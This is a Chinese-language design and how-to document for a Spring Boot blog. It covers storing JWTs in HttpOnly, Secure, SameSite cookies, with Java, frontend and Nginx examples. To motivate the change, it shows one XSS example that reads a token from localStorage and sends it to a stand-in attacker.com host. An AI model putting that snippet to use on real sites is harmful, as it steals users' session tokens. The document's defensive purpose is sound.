# HttpOnly Cookie 安全增强文档

## 📋 概述

本次更新实现了使用 **HttpOnly Cookie** 存储 JWT Token，有效防止 XSS（跨站脚本攻击）窃取用户认证Token。

---

## 🔐 安全问题背景

### 传统方案的风险

**之前**: Token存储在 `localStorage` 或 `sessionStorage`
```javascript
// ❌ 不安全：JavaScript可以访问
localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIs...');

// XSS攻击示例
<script>
  const token = localStorage.getItem('token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**风险**: 
- ❌ XSS攻击可轻松窃取Token
- ❌ 任何JavaScript代码都能读取
- ❌ 第三方脚本也可能泄露Token

---

### 新方案：HttpOnly Cookie

**现在**: Token存储在 HttpOnly Cookie中
```java
Cookie cookie = new Cookie("AUTH_TOKEN", token);
cookie.setHttpOnly(true);  // ✅ JavaScript无法访问
cookie.setSecure(true);    // ✅ 仅HTTPS传输
cookie.setAttribute("SameSite", "Strict");  // ✅ 防止CSRF
response.addCookie(cookie);
```

**优势**:
- ✅ **XSS防护**: JavaScript完全无法访问Cookie内容
- ✅ **CSRF防护**: SameSite属性防止跨站请求伪造
- ✅ **自动携带**: 浏览器自动在请求中携带Cookie
- ✅ **服务端控制**: 只有服务端可以设置和清除

---

## 🛠️ 技术实现

### 1. CookieSecurityConfig 配置类

**文件**: `src/main/java/com/leo/myblog/config/CookieSecurityConfig.java`

```java
@Configuration
public class CookieSecurityConfig {
    
    @Value("${jwt.cookie.name:AUTH_TOKEN}")
    private String cookieName;
    
    @Value("${jwt.cookie.max-age:86400}")
    private int cookieMaxAge;
    
    /**
     * 创建安全的HttpOnly Cookie
     */
    public Cookie createSecureCookie(String token) {
        Cookie cookie = new Cookie(cookieName, token);
        
        // 核心安全设置
        cookie.setHttpOnly(true);           // 禁止JavaScript访问
        cookie.setSecure(false);            // 开发环境false，生产环境true
        cookie.setPath("/");                // 作用路径
        cookie.setMaxAge(cookieMaxAge);     // 过期时间（24小时）
        cookie.setAttribute("SameSite", "Strict");  // CSRF防护
        
        return cookie;
    }
    
    /**
     * 创建清除Cookie（用于登出）
     */
    public Cookie createClearCookie() {
        Cookie cookie = new Cookie(cookieName, null);
        cookie.setHttpOnly(true);
        cookie.setPath("/");
        cookie.setMaxAge(0);  // 立即过期
        cookie.setAttribute("SameSite", "Strict");
        return cookie;
    }
}
```

### 2. 登录接口修改

**文件**: `src/main/java/com/leo/myblog/controller/UserController.java`

```java
@PostMapping("/login")
public Result<LoginResponse> login(@Valid @RequestBody LoginRequest request,
                                   HttpServletResponse response) {
    LoginResponse loginResponse = userService.login(request);
    
    // 将Token设置到HttpOnly Cookie中
    Cookie authCookie = cookieSecurityConfig.createSecureCookie(loginResponse.getToken());
    response.addCookie(authCookie);
    
    log.info("用户登录成功，已设置HttpOnly Cookie: userId={}", loginResponse.getUserId());
    
    return Result.success("登录成功", loginResponse);
}
```

### 3. 登出接口修改

```java
@PostMapping("/logout")
public Result<Void> logout(@RequestAttribute Long userId,
                           @RequestAttribute String username,
                           @RequestHeader(value = "Authorization", required = false) String authorization,
                           HttpServletResponse response) {
    // ... Token黑名单逻辑 ...
    
    // 清除HttpOnly Cookie
    Cookie clearCookie = cookieSecurityConfig.createClearCookie();
    response.addCookie(clearCookie);
    
    log.info("已清除HttpOnly Cookie，用户注销完成: userId={}", userId);
    
    return Result.success("注销成功", null);
}
```

---

## ⚙️ 配置说明

### application.yml 配置项

```yaml
jwt:
  cookie:
    name: AUTH_TOKEN          # Cookie名称
    max-age: 86400            # 过期时间（秒），默认24小时
```

### 生产环境配置

**重要**: 生产环境必须启用HTTPS并设置Secure标志

```yaml
# 生产环境配置
jwt:
  cookie:
    secure: true              # 仅HTTPS传输
```

然后在代码中启用：
```java
cookie.setSecure(true);  // 生产环境必须为true
```

---

## 🔒 安全特性详解

### 1. HttpOnly (XSS防护)

**作用**: 禁止JavaScript通过`document.cookie`访问Cookie

```javascript
// ❌ 无法访问
console.log(document.cookie);  // 不包含AUTH_TOKEN

// ❌ 无法窃取
fetch('/api/users/me', {
  credentials: 'include'  // 浏览器自动携带Cookie
});
```

**防护效果**:
- ✅ 阻止XSS攻击窃取Token
- ✅ 阻止恶意脚本读取认证信息
- ✅ 即使页面被注入脚本也无法获取Token

### 2. SameSite=Strict (CSRF防护)

**作用**: 仅允许同站请求携带Cookie

```
✅ 同站请求: myblog.com → myblog.com/api/posts (携带Cookie)
❌ 跨站请求: evil.com → myblog.com/api/posts (不携带Cookie)
```

**防护效果**:
- ✅ 防止跨站请求伪造攻击
- ✅ 阻止第三方网站利用用户身份执行操作
- ✅ 保护POST、PUT、DELETE等敏感操作

**其他选项**:
- `Strict`: 最严格，所有跨站请求都不携带
- `Lax`: 允许顶级导航的GET请求携带（推荐用于某些场景）
- `None`: 允许所有跨站请求（需要Secure=true）

### 3. Secure (HTTPS强制)

**作用**: 仅通过HTTPS协议传输Cookie

```
✅ HTTPS: https://myblog.com (传输Cookie)
❌ HTTP: http://myblog.com (不传输Cookie)
```

**防护效果**:
- ✅ 防止中间人攻击窃听
- ✅ 确保加密传输
- ✅ 生产环境必须启用

---

## 🧪 测试验证

### 1. 登录测试

```bash
curl -X POST http://localhost:8080/api/users/login \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "password": "password123"
  }' \
  -v

# 检查响应头中的Set-Cookie
# Set-Cookie: AUTH_TOKEN=eyJhbGciOiJIUzI1NiIs...; Path=/; Max-Age=86400; HttpOnly; SameSite=Strict
```

### 2. 验证JavaScript无法访问

打开浏览器控制台：
```javascript
// 应该看不到AUTH_TOKEN
console.log(document.cookie);

// 尝试直接访问（应该返回undefined）
document.cookie.split(';').find(c => c.trim().startsWith('AUTH_TOKEN='));
```

### 3. 自动携带测试

```javascript
// 前端请求无需手动设置Token
fetch('/api/users/me', {
  method: 'GET',
  credentials: 'include'  // 浏览器自动携带Cookie
})
.then(res => res.json())
.then(data => console.log(data));
```

### 4. 登出测试

```bash
curl -X POST http://localhost:8080/api/users/logout \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..." \
  -v

# 检查响应头中的Set-Cookie（清除Cookie）
# Set-Cookie: AUTH_TOKEN=; Path=/; Max-Age=0; HttpOnly; SameSite=Strict
```

---

## 📝 前端适配指南

### React 示例

```jsx
// ✅ 无需手动管理Token，浏览器自动携带
const fetchUserData = async () => {
  const response = await fetch('/api/users/me', {
    credentials: 'include'  // 重要：允许携带Cookie
  });
  return response.json();
};

// 登录
const handleLogin = async (username, password) => {
  const response = await fetch('/api/users/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',  // 接收Cookie
    body: JSON.stringify({ username, password })
  });
  
  // Cookie会自动保存，无需localStorage
  return response.json();
};

// 登出
const handleLogout = async () => {
  await fetch('/api/users/logout', {
    method: 'POST',
    credentials: 'include'  // 携带Cookie以清除
  });
  
  // Cookie会自动清除
};
```

### Vue 3 示例

```vue
<script setup>
import { ref } from 'vue';

// 获取用户数据
const getUserData = async () => {
  const response = await fetch('/api/users/me', {
    credentials: 'include'
  });
  return response.json();
};

// 登录
const login = async (username, password) => {
  const response = await fetch('/api/users/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include',
    body: JSON.stringify({ username, password })
  });
  
  return response.json();
};

// 登出
const logout = async () => {
  await fetch('/api/users/logout', {
    method: 'POST',
    credentials: 'include'
  });
};
</script>
```

### Axios 配置

```javascript
import axios from 'axios';

// 全局配置
axios.defaults.withCredentials = true;  // 自动携带Cookie

// 或者单个请求
axios.get('/api/users/me', {
  withCredentials: true
});

axios.post('/api/users/login', {
  username: 'test',
  password: '123456'
}, {
  withCredentials: true  // 接收Cookie
});
```

---

## 🔄 向后兼容性

### 双模式支持

系统同时支持两种认证方式：

1. **HttpOnly Cookie** (推荐)
   ```bash
   curl http://localhost:8080/api/users/me \
     --cookie "AUTH_TOKEN=eyJhbGciOiJIUzI1NiIs..."
   ```

2. **Authorization Header** (兼容旧版)
   ```bash
   curl http://localhost:8080/api/users/me \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."
   ```

### 优先级

当两种方式同时存在时，优先使用 Authorization Header：

```java
String token = null;
if (authorization != null && authorization.startsWith("Bearer ")) {
    token = authorization.substring(7);  // 优先使用Header
}
// 否则从Cookie中读取（由Spring自动处理）
```

---

## 🚀 部署指南

### 1. 本地开发环境

```yaml
# application-dev.yml
jwt:
  cookie:
    name: AUTH_TOKEN
    max-age: 86400
    secure: false  # 开发环境允许HTTP
```

### 2. 生产环境

```yaml
# application-prod.yml
jwt:
  cookie:
    name: AUTH_TOKEN
    max-age: 86400
    secure: true   # 生产环境强制HTTPS
```

**Nginx配置**:
```nginx
server {
    listen 443 ssl;
    server_name myblog.com;
    
    # SSL证书配置
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    location / {
        proxy_pass http://backend:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

# HTTP重定向到HTTPS
server {
    listen 80;
    server_name myblog.com;
    return 301 https://$server_name$request_uri;
}
```

---

## 📊 安全对比

| 特性 | localStorage | HttpOnly Cookie |
|------|-------------|-----------------|
| XSS防护 | ❌ 无 | ✅ 完全防护 |
| CSRF防护 | ⚠️ 需额外措施 | ✅ SameSite |
| 自动携带 | ❌ 需手动添加 | ✅ 浏览器自动 |
| 客户端访问 | ✅ 可读可写 | ❌ 不可访问 |
| 服务端控制 | ❌ 无法控制 | ✅ 完全控制 |
| 过期管理 | ⚠️ 需手动清理 | ✅ 自动过期 |
| 域名隔离 | ❌ 子域共享 | ✅ 可配置 |

---

## ⚠️ 注意事项

### 1. 生产环境必须启用HTTPS

```java
// ❌ 危险：HTTP传输会泄露Token
cookie.setSecure(false);

// ✅ 安全：仅HTTPS传输
cookie.setSecure(true);
```

### 2. CORS配置

前端跨域请求时必须设置：
```javascript
fetch(url, {
  credentials: 'include'  // 允许携带Cookie
});
```

后端CORS配置：
```java
configuration.setAllowCredentials(true);  // 允许携带凭证
```

### 3. Cookie大小限制

- 单个Cookie最大4KB
- JWT Token通常小于4KB，适合存储
- 如果Token过大，考虑使用Session ID

### 4. 多域名场景

如果需要跨子域共享Cookie：
```java
cookie.setDomain(".myblog.com");  // 所有子域共享
```

---

## 🔍 故障排查

### 问题1: Cookie未设置

**症状**: 登录后没有Set-Cookie响应头

**检查**:
```bash
# 查看后端日志
docker logs myblog-backend | grep "HttpOnly Cookie"

# 检查响应头
curl -v http://localhost:8080/api/users/login ...
```

**解决**: 确认CookieSecurityConfig Bean已正确注入

### 问题2: Cookie未携带

**症状**: 请求中没有Cookie

**检查**:
```javascript
// 前端是否正确配置
fetch('/api/users/me', {
  credentials: 'include'  // 必须有这行
});
```

**解决**: 添加`credentials: 'include'`

### 问题3: 跨域Cookie问题

**症状**: 跨域请求Cookie丢失

**检查**:
1. CORS配置是否允许credentials
2. Cookie的Domain和Path是否正确
3. SameSite属性是否过于严格

**解决**:
```java
// 放宽SameSite限制
cookie.setAttribute("SameSite", "Lax");

// 或使用None（需要Secure=true）
cookie.setAttribute("SameSite", "None");
cookie.setSecure(true);
```

---

## 📚 参考资料

- [OWASP HttpOnly Cookie](https://owasp.org/www-community/controls/HttpOnly)
- [MDN Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [RFC 6265 - HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)
- [SameSite Cookies Explained](https://web.dev/samesite-cookies-explained/)

---

## ✅ 总结

### 核心优势

1. **XSS防护**: JavaScript完全无法访问Token
2. **CSRF防护**: SameSite属性阻止跨站请求
3. **自动管理**: 浏览器自动处理携带和过期
4. **向后兼容**: 仍支持Authorization Header

### 下一步建议

1. **启用HTTPS**: 生产环境必须使用HTTPS
2. **监控日志**: 关注异常登录和Token使用
3. **定期轮换**: 考虑实现Token刷新机制
4. **审计跟踪**: 记录所有认证相关操作

---

**更新时间**: 2026-05-21  
**版本**: v1.0  
**维护者**: Leo
